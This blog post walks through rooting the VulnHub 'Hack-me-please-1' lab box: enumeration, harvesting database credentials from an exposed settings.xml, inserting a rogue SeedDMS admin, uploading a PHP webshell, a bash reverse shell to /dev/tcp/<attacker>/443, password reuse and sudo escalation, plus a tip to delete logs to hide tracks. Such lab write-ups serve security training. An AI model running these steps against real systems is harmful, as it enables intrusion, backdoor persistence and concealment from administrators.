---
published: true
layout: post
author: mark
date: '2020-08-17 00:00:01 UTC'
tags: ctf vulnhub hmp
---
This week we are taking a look at a box from VulnHub. [Hack-me-please-1](https://www.vulnhub.com/entry/hack-me-please-1,731/) (Easy Difficulty)

##  Prep:
- Check VMs running
- Coffee
- We will be using a base Kali VM for this.

##  Writeup:

**Goal: Get root login.**

We always start with an nmap scan.
```
nmap -sC -sV <target> -oN nmap
```
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 12:00 AEST
Nmap scan report for 192.168.1.161
Host is up (2.0s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
80/tcp   open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to the land of pwnland
514/tcp  filtered shell
3306/tcp open     mysql   MySQL 8.0.25-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.25-0ubuntu0.20.04.1
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SupportsCompression, Speaks41ProtocolOld, FoundRows, ConnectWithDatabase, LongPassword, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsTransactions, DontAllowDatabaseTableColumn, SwitchToSSLAfterHandshake, LongColumnFlag, InteractiveClient, IgnoreSigpipes, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Nae2/j\x1Ex+\x01\x0F\x0B!x\x04S\x12\x08a\x11
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
| Not valid before: 2021-07-03T00:33:15
|_Not valid after:  2031-07-01T00:33:15

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 261.78 seconds
```

We can see that we have a website on port 80, an unknown on port 514 and mysql on 3306.

_You come to a fork in the path. Background enumeration or poking through the site;_

Background enumeration with gobuster:

If you haven't already, install gobuster & seclists 

```
sudo apt install gobuster
sudo apt install seclists
```

Now lets run a gobuster scan
```
gobuster dir -u http://<target>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

and looking through the output gets us not much right now.
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.161/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/12 12:14:15 Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 312] [--> http://192.168.1.161/img/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.1.161/css/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.1.161/js/] 
/fonts                (Status: 301) [Size: 314] [--> http://192.168.1.161/fonts/]
/server-status        (Status: 403) [Size: 278]                                  
                                                                                 
===============================================================
2021/08/12 12:14:45 Finished
===============================================================
```

Ok back to poking around in the website:

Using browser dev tools to poke around on the website itself, we notice that the contact us form does not POST anywhere using the HTML <form action /> so we take a dive into the JavaScript to see if the JavaScript is handling the form submit.

While digging into the main.js file, there is an interesting code comment:

![index.png]({{site.baseurl}}/Images/vb-hmp/index.png)



This tells us that there is another endpoint under the website to visit.

Navigating to that directory we get redirected around to a new application with a standard login form and it uses php.

`http://<target>/seeddms51x/seeddms-5.1.22/`

Looking at the path it looks like the application name is seeddms and the version is 5.1.22. So lets use searchsploit to see if there are any known vulnerabilities with this application

`searchsploit seeddms`

```
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)                | php/webapps/50062.py
SeedDMS 5.1.18 - Persistent Cross-Site Scripting                               | php/webapps/48324.txt
SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting                     | php/webapps/47024.txt
SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting                       | php/webapps/47023.txt
SeedDMS versions < 5.1.11 - Remote Command Execution                           | php/webapps/47022.txt
------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Unfortunately, nothing that matches the version we we believe is running. 

_You come to a fork in the path. One way leads to a bit of a red herring._

Seeddms has an install page on /install:

```
http://<target>/seeddms51x/seeddms-5.1.22/install/
```

However when we click `start installation` it just gives us a message saying it needs a file on the server. :(
```
For installation of SeedDMS, you must create the file conf/ENABLE_INSTALL_TOOL
```

Bummer. 
We need to reset our thinking and treat seeddms as a new website. Let run some enumeration on seeddms.
Back to gobuster and some enumeration treating this as a brand new website.
```
gobuster dir -u http://<target>/seeddms51x/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.161/seeddms51x/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/12 12:35:54 Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 301) [Size: 324] [--> http://192.168.1.161/seeddms51x/data/]
/www                  (Status: 301) [Size: 323] [--> http://192.168.1.161/seeddms51x/www/] 
/conf                 (Status: 301) [Size: 324] [--> http://192.168.1.161/seeddms51x/conf/]
/pear                 (Status: 301) [Size: 324] [--> http://192.168.1.161/seeddms51x/pear/]
                                                                                           
===============================================================
2021/08/12 12:36:24 Finished
===============================================================
```

This looks promising. However data, conf and pear all redirect to a forbidden page if we try to browse them. And www redirects to the application login page.

```
http://<target>/seeddms51x/conf/
http://<target>/seeddms51x/www/
```

It is likely that directory listing or a .htaccess file is preventing us from opening the directory directly in the browser (the forbidden page). 

LESSON LEARNED: Gobuster other interesting folders. Just because the folder returns a 403 doesn’t mean that files in that folder aren’t readable.
```
gobuster dir -u http://<target>/seeddms51x/conf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x xml,txt,php,html
```
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.161/seeddms51x/conf
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              xml,txt,php,html
[+] Timeout:                 10s
===============================================================
2021/08/12 12:44:00 Starting gobuster in directory enumeration mode
===============================================================
/settings.xml         (Status: 200) [Size: 12377]
```

And here in the conf dir we see a settings.xml file. Lets see if we can download it (because browser are notoriously garbage at rendering XML).
```
wget http://<target>/seeddms51x/conf/settings.xml
```
Lets cat that file and see its dirty secrets.
```
cat settings.xml
```
Or you could shortcut and grep for a dbPass field (if you know to look for a dbPass)
```
grep dbPass settings.xml
```

Ah this gives us a db connection string/creds
```
<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="seeddms" doNotCheckVersion="false">
    </database>
    
backupDir="/var/www/html/seeddms51x/data/backup/"
```

Lets see if the credentials work:
```
mysql -h 192.168.1.xxx -u seeddms -p
```
Password: `seeddms`
```
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 21
Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```
We get a connection. Lets see what databases are available.
```
show databases;
```
```
MySQL [(none)]> MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| seeddms            |
| sys                |
+--------------------+
5 rows in set (0.004 sec)
```

Lets start with the seeddms db first and show us them tables.
```
connect seeddms;
show tables;
```
```
MySQL [seeddms]> show tables;
+------------------------------+
| Tables_in_seeddms            |
+------------------------------+
| tblACLs                      |
| tblAttributeDefinitions      |
| tblCategory                  |
| tblDocumentApproveLog        |
| tblDocumentApprovers         |
| tblDocumentAttributes        |
| tblDocumentCategory          |
| tblDocumentContent           |
| tblDocumentContentAttributes |
| tblDocumentFiles             |
| tblDocumentLinks             |
| tblDocumentLocks             |
| tblDocumentReviewLog         |
| tblDocumentReviewers         |
| tblDocumentStatus            |
| tblDocumentStatusLog         |
| tblDocuments                 |
| tblEvents                    |
| tblFolderAttributes          |
| tblFolders                   |
| tblGroupMembers              |
| tblGroups                    |
| tblKeywordCategories         |
| tblKeywords                  |
| tblMandatoryApprovers        |
| tblMandatoryReviewers        |
| tblNotify                    |
| tblSessions                  |
| tblUserImages                |
| tblUserPasswordHistory       |
| tblUserPasswordRequest       |
| tblUsers                     |
| tblVersion                   |
| tblWorkflowActions           |
| tblWorkflowDocumentContent   |
| tblWorkflowLog               |
| tblWorkflowMandatoryWorkflow |
| tblWorkflowStates            |
| tblWorkflowTransitionGroups  |
| tblWorkflowTransitionUsers   |
| tblWorkflowTransitions       |
| tblWorkflows                 |
| users                        |
+------------------------------+
43 rows in set (0.002 sec)
```
Ah what we see here are two users tables (users and tblUsers).

Lets start with the Users table.
```
select * from users;

+-------------+---------------------+--------------------+-----------------+
| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
+-------------+---------------------+--------------------+-----------------+
|           1 | saket               | saurav             | Saket@#$1337    |
+-------------+---------------------+--------------------+-----------------+
1 row in set (0.003 sec)
```
Nice. We have a password. It does not get us into seeddms, but we will take a note of it either way.

A quick check of that password for the Ubuntu_CTF user in the OS doesn’t work either and we previously noted in the nmap there weren’t any ports that indicated direct ssh being a possibility.

Lets check the other tblUsers table.
```
select * from tblUsers;

+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
| id | login | pwd                              | fullName      | email              | language | theme | comment | role | hidden | pwdExpiration       | loginfailures | disabled | quota | homefolder |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
|  1 | admin | f9ef2c539bad8a6d2f3432b6d49ab51a | Administrator | address@server.com | en_GB    |       |         |    1 |      0 | 2021-07-13 00:12:25 |             0 |        0 |     0 |       NULL |
|  2 | guest | NULL                             | Guest User    | NULL               |          |       |         |    2 |      0 | NULL                |             0 |        0 |     0 |       NULL |
+----+-------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
```
The tblUsers table has the admin account and a hashed password. The hashed password looks like a straight forward MD5 (which we confirm by a simple google of the application and password reset for admin user). Running the password through hashcat and the rockyou wordlist comes up empty but we do have database admin permissions….

We want to try and be as unobtrusive as possible so instead of modifying the admin pwd hash, we try to just manually create our own admin account.

Using the `md5sum` command we can generate our own password hash:
```
echo -n thoseguys | md5sum
fa91c48020573febfb512d1d5957877d
```
And then use that info to create our own admin account:
```
INSERT INTO tblUsers (login, pwd, fullName, email, language, theme, comment, role, hidden, pwdExpiration, loginfailures, disabled, quota, homefolder) VALUES ("thoseguys", "fa91c48020573febfb512d1d5957877d", "thoseguys", "thoseguys@1337.h4x", "en_GB","","", 1, 0, "2021-07-13 00:12:25", 0, 0, 0, NULL);

Query OK, 1 row affected (0.005 sec)
```
```
MySQL [seeddms]> select * from tblUsers;
+----+-----------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
| id | login     | pwd                              | fullName      | email              | language | theme | comment | role | hidden | pwdExpiration       | loginfailures | disabled | quota | homefolder |
+----+-----------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
|  1 | admin     | f9ef2c539bad8a6d2f3432b6d49ab51a | Administrator | address@server.com | en_GB    |       |         |    1 |      0 | 2021-07-13 00:12:25 |             0 |        0 |     0 |       NULL |
|  2 | guest     | NULL                             | Guest User    | NULL               |          |       |         |    2 |      0 | NULL                |             0 |        0 |     0 |       NULL |
|  5 | thoseguys | fa91c48020573febfb512d1d5957877d | thoseguys     | thoseguys@1337.h4x | en_GB    |       |         |    1 |      0 | 2021-07-13 00:12:25 |             0 |        0 |     0 |       NULL |
+----+-----------+----------------------------------+---------------+--------------------+----------+-------+---------+------+--------+---------------------+---------------+----------+-------+------------+
3 rows in set (0.001 sec)
```

Now we can log into the application without the admin easily knowing they have been compromised.

SIDETRACK: While you are in as an new admin, you could look into deleting the logfiles to hide your tracks.

Where to next. Well php and shells go well together so lets get a simple webshell and go from there.For this

Kali has one available to us already: 
```
/usr/share/webshells/php/simple-backdoor.php
```
Upload the “document” and now just to call it. Make sure you note the document id and version of the file. 
NOTE: when adding a document it displays a blank screen but is successful. The app seems a bit buggy (which is good for us).

Doing some hunting we discover that files get uploaded into a default directory `/data/1048576/[file_id]/[version].[extension]`

We discovered `/data` in our enumeration phase. Time to plug in our file id and see if we can access it directly as well.

Lets try navigate to our shell. 

`http://<target>/seeddms51x/data/1048576/4/1.php`

![webshell.png]({{site.baseurl}}/Images/vb-hmp/webshell.png)


Adding our query string we can see that we have a working web shell:
```
?cmd=whoami
```

![webshell1.png]({{site.baseurl}}/Images/vb-hmp/webshell1.png)


now we can do some basic enumeration of the machine itself. Through this we discover that nc is installed and hopefully we can use that to create our reverse shell:
```
?cmd=which+nc
```

![webshell2.png]({{site.baseurl}}/Images/vb-hmp/webshell2.png)


Lets go for a simple php reverse shell:
```
touch rev.php 
vim rev.php
```
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker>/443 0>&1'");?>
```
Upload this file. If you upload a new document note the new document ID otherwise note the version.

Set up a listener on the attackers machine:
```
nc -nlvp 443
```
Lets hit the file:
```
http://<target>/seeddms51x/data/1048576/4/2.php
```
And we have a shell as www-data:
```
nc -nlvp 443        
listening on [any] 443 ...
connect to [192.168.1.162] from (UNKNOWN) [192.168.1.161] 36788
bash: cannot set terminal process group (921): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/seeddms51x/data/1048576/4$ 
```
Now that we are on the box, we do some basic enumeration. straight away looking at the passwd file we notice a name we have seen before:
```
cat /etc/passwd 
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
saket:x:1000:1000:Ubuntu_CTF,,,:/home/saket:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:126:133:MySQL Server,,,:/nonexistent:/bin/false
```
Lets try upgrade to saket
```
su saket
Password:Saket@#$1337
```
it looks blank but what we have is a /bin/sh shell. Time to upgrade it with python:
```
which python2
python2 -c 'import pty; pty.spawn("/bin/bash")'

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

saket@ubuntu:~$ 
```
We notice on our bash screen that we are advised to run admin commands as sudo.

We can confirm this with the command sudo -l
```
sudo -l

sudo -l
[sudo] password for saket: Saket@#$1337

Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (ALL : ALL) ALL
```
to upgrade to root we simply run sudo su:
```
sudo su
```
As mentioned as the goal on the VulnHub page, root shell is the target which we now have. Win.
